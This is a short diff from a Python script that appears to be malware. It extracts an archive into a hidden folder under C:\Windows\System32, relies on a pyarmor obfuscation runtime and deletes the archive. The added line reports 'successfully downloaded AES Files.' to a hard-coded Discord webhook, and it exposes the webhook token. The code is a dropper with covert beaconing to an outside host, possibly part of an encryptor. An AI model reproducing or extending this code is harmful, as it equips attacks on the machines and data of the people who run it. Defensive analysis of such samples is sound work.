@@ -178,6 +178,7 @@ if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     extract_dir = r'C:\Windows\System32\WCNMX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
+    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "successfully downloaded AES Files.")
 
 
 import os
